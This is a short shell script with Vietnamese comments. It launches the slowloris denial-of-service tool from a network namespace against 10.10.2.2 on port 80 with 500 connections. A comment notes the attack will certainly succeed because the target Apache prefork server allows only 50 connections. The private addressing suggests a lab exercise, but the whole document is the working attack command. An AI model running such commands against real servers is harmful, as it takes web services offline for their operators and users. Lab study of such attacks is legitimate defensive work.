# Đảm bảo đã cài đặt gói slowloris
# Chạy với quyền sudo

ip netns exec ns10 /usr/bin/slowloris 10.10.2.2 -p 80 -s 500 # slowloris với 500 kết nối, chắc chắn tấn công thành công vì apache prefork cấu hình tối đa 50 kết nối